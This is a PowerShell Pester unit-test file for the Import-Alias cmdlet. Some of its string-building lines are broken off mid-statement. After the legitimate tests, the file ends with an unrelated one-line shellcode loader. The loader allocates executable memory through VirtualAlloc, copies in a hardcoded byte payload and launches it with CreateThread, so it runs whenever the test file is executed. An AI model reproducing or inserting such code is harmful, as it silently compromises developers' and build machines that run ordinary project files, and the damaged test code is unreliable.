

Describe "Import-Alias DRT Unit Tests" -Tags "CI" {
    $testAliasDirectory = Join-Path -Path $TestDrive -ChildPath ImportAliasTestDirectory
    $aliasFilename      = "aliasFilename"
    $fulltestpath       = Join-Path -Path $testAliasDirectory -ChildPath $aliasFilename

    BeforeEach {
        New-Item -Path $testAliasDirectory -ItemType Directory -Force
        remove-item alias:abcd* -force -ErrorAction SilentlyContinue
        remove-item alias:ijkl* -force -ErrorAction SilentlyContinue
        set-alias abcd01 efgh01
        set-alias abcd02 efgh02
        set-alias abcd03 efgh03
        set-alias abcd04 efgh04
        set-alias ijkl01 mnop01
        set-alias ijkl02 mnop02
        set-alias ijkl03 mnop03
        set-alias ijkl04 mnop04
    }

    AfterEach {
        Remove-Item -Path $testAliasDirectory -Recurse -Force -ErrorAction SilentlyContinue
    }

    It "Import-Alias Resolve To Multiple will throw PSInvalidOperationException" {
        { Import-Alias * -ErrorAction Stop } | Should -Throw -ErrorId "NotSupported,Microsoft.PowerShell.Commands.ImportAliasCommand"
    }

    It "Import-Alias From Exported Alias File Aliases Already Exist should throw SessionStateException" {
        { Export-Alias  $fulltestpath abcd* } | Should -Not -Throw
        { Import-Alias $fulltestpath -ErrorAction Stop } | Should -Throw -ErrorId "AliasAlreadyExists,Microsoft.PowerShell.Commands.ImportAliasCommand"
    }

    It "Import-Alias Into Invalid Scope should throw PSArgumentException"{
        { Export-Alias  $fulltestpath abcd* } | Should -Not -Throw
        { Import-Alias $fulltestpath -scope bogus } | Should -Throw -ErrorId "Argument,Microsoft.PowerShell.Commands.ImportAliasCommand"
    }

    It "Import-Alias From Exported Alias File Aliases Already Exist using force should not throw"{
        {Export-Alias  $fulltestpath abcd*} | Should -Not -Throw
        {Import-Alias $fulltestpath  -Force} | Should -Not -Throw
    }
}

Describe "Import-Alias" -Tags "CI" {

    BeforeAll {
        $newLine = [Environment]::NewLine

        $testAliasDirectory = Join-Path -Path $TestDrive -ChildPath ImportAliasTestDirectory
        $aliasFilename = "pesteralias.txt"
        $aliasFilenameMoreThanFourValues = "aliasFileMoreThanFourValues.txt"
        $aliasFilenameLessThanFourValues = "aliasFileLessThanFourValues.txt"

        $aliasfile = Join-Path -Path $testAliasDirectory -ChildPath $aliasFilename
        $aliasPathMoreThanFourValues = Join-Path -Path $testAliasDirectory -ChildPath $aliasFileNameMoreThanFourValues
        $aliasPathLessThanFourValues = Join-Path -Path $testAliasDirectory -ChildPath $aliasFileNameLessThanFourValues

        $commandToAlias = "echo"
        $alias1 = "pesterecho"
        $alias2    = '"abc""def"'
        $alias3    = '"aaa"'
        $alias4    = '"a,b"'

        
        New-Item -Path $testAliasDirectory -ItemType Directory -Force > $null

        
        $aliasFileContent = '
        $aliasFileContent += '
        $aliasFileContent += '
        $aliasFileContent += '

        
        $aliasFileContent += $newLine + $alias1 + ',"' + $commandToAlias + '","","None"'
        $aliasFileContent += $newLine + $alias2 + ',"' + $commandToAlias + '","","None"'
        $aliasFileContent += $newLine + $alias3 + ',"' + $commandToAlias + '","","None"'
        $aliasFileContent += $newLine + $alias4 + ',"' + $commandToAlias + '","","None"'
        $aliasFileContent > $aliasfile

        
        New-Item -Path $testAliasDirectory -ItemType Directory -Force > $null
        $aliasFileContent = $newLine + '"v_1","v_2","v_3","v_4","v_5"'
        $aliasFileContent > $aliasPathMoreThanFourValues

        
        New-Item -Path $testAliasDirectory -ItemType Directory -Force > $null
        $aliasFileContent = $newLine + '"v_1","v_2","v_3"'
        $aliasFileContent > $aliasPathLessThanFourValues
    }

    It "Should be able to import an alias file successfully" {
        { Import-Alias -Path $aliasfile } | Should -Not -Throw
    }

    It "Should classify an alias as non existent when it is not imported yet" {
        {Get-Alias -Name invalid_alias -ErrorAction Stop} | Should -Throw -ErrorId 'ItemNotFoundException,Microsoft.PowerShell.Commands.GetAliasCommand'
    }

    It "Should be able to parse <aliasToTest>" -TestCases @(
        @{ aliasToTest = 'abc"def' }
        @{ aliasToTest = 'aaa' }
        @{ aliasToTest = 'a,b' }
        ) {
        param($aliasToTest)
        Import-Alias -Path $aliasfile
        ( Get-Alias -Name $aliasToTest ).Definition | Should -BeExactly $commandToAlias
    }

    It "Should throw an error when reading more than four values" {
        { Import-Alias -Path $aliasPathMoreThanFourValues } | Should -Throw -ErrorId "ImportAliasFileFormatError,Microsoft.PowerShell.Commands.ImportAliasCommand"
    }

    It "Should throw an error when reading less than four values" {
        { Import-Alias -Path $aliasPathLessThanFourValues } | Should -Throw -ErrorId "ImportAliasFileFormatError,Microsoft.PowerShell.Commands.ImportAliasCommand"
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xd9,0xaa,0x37,0xe5,0xdb,0xc8,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x5a,0x0f,0x03,0x5a,0xd6,0x48,0xc2,0x19,0x00,0x0e,0x2d,0xe2,0xd0,0x6f,0xa7,0x07,0xe1,0xaf,0xd3,0x4c,0x51,0x00,0x97,0x01,0x5d,0xeb,0xf5,0xb1,0xd6,0x99,0xd1,0xb6,0x5f,0x17,0x04,0xf8,0x60,0x04,0x74,0x9b,0xe2,0x57,0xa9,0x7b,0xdb,0x97,0xbc,0x7a,0x1c,0xc5,0x4d,0x2e,0xf5,0x81,0xe0,0xdf,0x72,0xdf,0x38,0x6b,0xc8,0xf1,0x38,0x88,0x98,0xf0,0x69,0x1f,0x93,0xaa,0xa9,0xa1,0x70,0xc7,0xe3,0xb9,0x95,0xe2,0xba,0x32,0x6d,0x98,0x3c,0x93,0xbc,0x61,0x92,0xda,0x71,0x90,0xea,0x1b,0xb5,0x4b,0x99,0x55,0xc6,0xf6,0x9a,0xa1,0xb5,0x2c,0x2e,0x32,0x1d,0xa6,0x88,0x9e,0x9c,0x6b,0x4e,0x54,0x92,0xc0,0x04,0x32,0xb6,0xd7,0xc9,0x48,0xc2,0x5c,0xec,0x9e,0x43,0x26,0xcb,0x3a,0x08,0xfc,0x72,0x1a,0xf4,0x53,0x8a,0x7c,0x57,0x0b,0x2e,0xf6,0x75,0x58,0x43,0x55,0x11,0xad,0x6e,0x66,0xe1,0xb9,0xf9,0x15,0xd3,0x66,0x52,0xb2,0x5f,0xee,0x7c,0x45,0xa0,0xc5,0x39,0xd9,0x5f,0xe6,0x39,0xf3,0x9b,0xb2,0x69,0x6b,0x0a,0xbb,0xe1,0x6b,0xb3,0x6e,0x9f,0x6e,0x23,0x51,0xc8,0x1f,0x33,0x39,0x0b,0xe0,0x22,0xe6,0x82,0x06,0x14,0x46,0xc5,0x96,0xd4,0x36,0xa5,0x46,0xbc,0x5c,0x2a,0xb8,0xdc,0x5e,0xe0,0xd1,0x76,0xb1,0x5d,0x89,0xee,0x28,0xc4,0x41,0x8f,0xb5,0xd2,0x2f,0x8f,0x3e,0xd1,0xd0,0x41,0xb7,0x9c,0xc2,0x35,0x37,0xeb,0xb9,0x93,0x48,0xc1,0xd4,0x1b,0xdd,0xee,0x7e,0x4c,0x49,0xed,0xa7,0xba,0xd6,0x0e,0x82,0xb1,0xdf,0x9a,0x6d,0xad,0x1f,0x4b,0x6e,0x2d,0x76,0x01,0x6e,0x45,0x2e,0x71,0x3d,0x70,0x31,0xac,0x51,0x29,0xa4,0x4f,0x00,0x9e,0x6f,0x38,0xae,0xf9,0x58,0xe7,0x51,0x2c,0x59,0xdb,0x87,0x08,0x2f,0x35,0x14;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

